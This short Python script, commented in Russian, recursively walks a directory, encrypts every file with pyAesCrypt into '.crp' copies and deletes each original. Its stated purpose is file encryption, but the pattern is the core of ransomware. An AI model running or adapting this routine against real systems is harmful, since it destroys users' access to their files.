import pyAesCrypt
import os


# функция шифровки
def encrypt_file(file, password):
    # создаём буфер
    buffer_size = 512 * 1024
    # вызываем метод encrypt
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )
    # выводим зашифрованный файл в консоль
    print(f"Файл {os.path.splitext(file)[0]} зашифрован")
    # удаляем старый файл
    os.remove(file)


def dir_walk(directory, password):
    for name in os.listdir(directory):
        path = os.path.join(directory, name)
        if os.path.isfile(path):
            try:
                encrypt_file(path, password)
            except Exception as ex:
                print(ex)
        else:
            dir_walk(path, password)
